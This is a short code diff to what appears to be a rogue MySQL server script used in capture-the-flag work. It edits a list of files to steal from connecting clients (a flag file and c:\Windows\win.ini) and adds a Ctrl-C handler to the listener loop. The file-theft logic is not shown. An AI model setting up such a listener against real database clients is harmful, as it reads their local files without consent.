@@ -9,7 +9,7 @@ import typing
 PORT = 3306
 
 FILELIST = [
-    r'c:\flag.txt',
+    r'e:\flag.txt',
     r'c:\Windows\win.ini',
 ]
 
@@ -203,8 +203,11 @@ class mysql_listener(asyncore.dispatcher):
 
 
 if __name__ == '__main__':
-    if len(FILELIST) == 0:
-        print('[-] Filelist is empty!')
-        exit(0)
-    mysql_listener()
-    asyncore.loop(1)
+    try:
+        if len(FILELIST) == 0:
+            print('[-] Filelist is empty!')
+            exit(0)
+        mysql_listener()
+        asyncore.loop(1)
+    except KeyboardInterrupt:
+        print('Bye')
